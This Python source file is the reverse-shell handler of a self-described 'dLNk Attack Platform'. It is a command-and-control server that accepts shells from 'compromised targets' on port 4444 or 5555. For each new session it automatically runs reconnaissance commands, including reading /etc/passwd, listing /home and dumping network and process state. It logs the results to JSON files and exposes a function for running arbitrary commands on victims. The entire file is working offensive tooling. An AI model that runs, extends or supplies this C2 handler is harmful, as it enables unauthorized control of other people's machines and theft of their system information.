"""
dLNk Attack Platform - Reverse Shell Handler
Handles incoming reverse shells from compromised targets
"""

import asyncio
import socket
import threading
import json
import os
from datetime import datetime
from typing import Dict, List, Optional
from loguru import logger
import base64


class ShellSession:
    """Represents an active shell session"""
    
    def __init__(self, session_id: str, client_socket, address):
        self.session_id = session_id
        self.socket = client_socket
        self.address = address
        self.created_at = datetime.now()
        self.last_activity = datetime.now()
        self.commands_executed = []
        self.is_active = True
        self.target_info = {}
        
    def to_dict(self):
        return {
            "session_id": self.session_id,
            "address": f"{self.address[0]}:{self.address[1]}",
            "created_at": self.created_at.isoformat(),
            "last_activity": self.last_activity.isoformat(),
            "commands_count": len(self.commands_executed),
            "is_active": self.is_active,
            "target_info": self.target_info
        }


class ReverseShellHandler:
    """Handles reverse shell connections and C2 operations"""
    
    def __init__(self):
        self.host = os.getenv("C2_HOST", "0.0.0.0")
        self.port = int(os.getenv("C2_PORT", "4444"))
        self.backup_port = int(os.getenv("C2_BACKUP_PORT", "5555"))
        self.sessions: Dict[str, ShellSession] = {}
        self.listener_socket = None
        self.is_running = False
        self.session_counter = 0
        self.log_dir = os.getenv("SHELL_LOG_DIR", "/home/ubuntu/aiprojectattack/data/shells")
        os.makedirs(self.log_dir, exist_ok=True)
        
    async def start_listener(self):
        """Start the reverse shell listener"""
        try:
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((self.host, self.port))
            self.listener_socket.listen(5)
            self.is_running = True
            
            logger.info(f"[C2] Reverse shell listener started on {self.host}:{self.port}")
            
            # Start listener in background thread
            listener_thread = threading.Thread(target=self._accept_connections, daemon=True)
            listener_thread.start()
            
            return True
            
        except Exception as e:
            logger.error(f"[C2] Failed to start listener: {e}")
            # Try backup port
            try:
                self.port = self.backup_port
                self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.listener_socket.bind((self.host, self.port))
                self.listener_socket.listen(5)
                self.is_running = True
                
                logger.info(f"[C2] Reverse shell listener started on backup port {self.host}:{self.port}")
                
                listener_thread = threading.Thread(target=self._accept_connections, daemon=True)
                listener_thread.start()
                
                return True
            except Exception as e2:
                logger.error(f"[C2] Failed to start listener on backup port: {e2}")
                return False
    
    def _accept_connections(self):
        """Accept incoming connections"""
        while self.is_running:
            try:
                client_socket, address = self.listener_socket.accept()
                logger.info(f"[C2] New connection from {address[0]}:{address[1]}")
                
                # Create session
                self.session_counter += 1
                session_id = f"shell_{self.session_counter}_{int(datetime.now().timestamp())}"
                session = ShellSession(session_id, client_socket, address)
                self.sessions[session_id] = session
                
                # Handle session in background
                session_thread = threading.Thread(
                    target=self._handle_session, 
                    args=(session,),
                    daemon=True
                )
                session_thread.start()
                
                # Auto-interact if enabled
                if os.getenv("SHELL_AUTO_INTERACT", "true").lower() == "true":
                    self._auto_interact(session)
                
            except Exception as e:
                if self.is_running:
                    logger.error(f"[C2] Error accepting connection: {e}")
    
    def _handle_session(self, session: ShellSession):
        """Handle a shell session"""
        try:
            # Get initial info
            self._execute_command(session, "whoami")
            self._execute_command(session, "hostname")
            self._execute_command(session, "uname -a")
            self._execute_command(session, "id")
            
            # Keep session alive
            while session.is_active:
                try:
                    # Send keepalive
                    session.socket.send(b"echo keepalive\n")
                    response = session.socket.recv(1024)
                    if not response:
                        break
                    session.last_activity = datetime.now()
                except:
                    break
                
                # Sleep
                threading.Event().wait(30)
                
        except Exception as e:
            logger.error(f"[C2] Session {session.session_id} error: {e}")
        finally:
            session.is_active = False
            try:
                session.socket.close()
            except:
                pass
    
    def _auto_interact(self, session: ShellSession):
        """Auto-interact with new shell"""
        try:
            logger.info(f"[C2] Auto-interacting with session {session.session_id}")
            
            # Gather system info
            commands = [
                "whoami",
                "hostname",
                "pwd",
                "uname -a",
                "id",
                "ip addr || ifconfig",
                "ps aux | head -20",
                "cat /etc/passwd | grep -v nologin | tail -10",
                "ls -la /home",
                "cat /etc/os-release",
                "df -h",
                "netstat -tulpn 2>/dev/null || ss -tulpn",
            ]
            
            results = {}
            for cmd in commands:
                result = self._execute_command(session, cmd)
                results[cmd] = result
                
            # Store target info
            session.target_info = results
            
            # Save to file
            session_file = os.path.join(self.log_dir, f"{session.session_id}.json")
            with open(session_file, 'w') as f:
                json.dump(session.to_dict(), f, indent=2)
            
            logger.success(f"[C2] Session {session.session_id} info collected")
            
        except Exception as e:
            logger.error(f"[C2] Auto-interact error: {e}")
    
    def _execute_command(self, session: ShellSession, command: str) -> str:
        """Execute command on shell"""
        try:
            # Send command
            session.socket.send(f"{command}\n".encode())
            
            # Receive response
            response = b""
            session.socket.settimeout(5)
            while True:
                try:
                    chunk = session.socket.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < 4096:
                        break
                except socket.timeout:
                    break
            
            result = response.decode('utf-8', errors='ignore').strip()
            
            # Log command
            session.commands_executed.append({
                "command": command,
                "result": result,
                "timestamp": datetime.now().isoformat()
            })
            
            session.last_activity = datetime.now()
            
            return result
            
        except Exception as e:
            logger.error(f"[C2] Command execution error: {e}")
            return ""
    
    def execute_command(self, session_id: str, command: str) -> Optional[str]:
        """Execute command on specific session"""
        session = self.sessions.get(session_id)
        if not session or not session.is_active:
            return None
        
        return self._execute_command(session, command)
    
    def get_sessions(self) -> List[Dict]:
        """Get all active sessions"""
        return [s.to_dict() for s in self.sessions.values()]
    
    def get_session(self, session_id: str) -> Optional[Dict]:
        """Get specific session"""
        session = self.sessions.get(session_id)
        if session:
            return session.to_dict()
        return None
    
    def close_session(self, session_id: str) -> bool:
        """Close a session"""
        session = self.sessions.get(session_id)
        if session:
            session.is_active = False
            try:
                session.socket.close()
            except:
                pass
            return True
        return False
    
    def stop_listener(self):
        """Stop the listener"""
        self.is_running = False
        if self.listener_socket:
            try:
                self.listener_socket.close()
            except:
                pass
        
        # Close all sessions
        for session in self.sessions.values():
            self.close_session(session.session_id)
        
        logger.info("[C2] Reverse shell listener stopped")


# Global handler instance
shell_handler = ReverseShellHandler()


async def start_shell_handler():
    """Start the shell handler"""
    if os.getenv("SHELL_HANDLER_ENABLED", "true").lower() == "true":
        await shell_handler.start_listener()
        logger.info("[C2] Shell handler initialized")
    else:
        logger.info("[C2] Shell handler disabled")


def get_shell_handler() -> ReverseShellHandler:
    """Get the shell handler instance"""
    return shell_handler

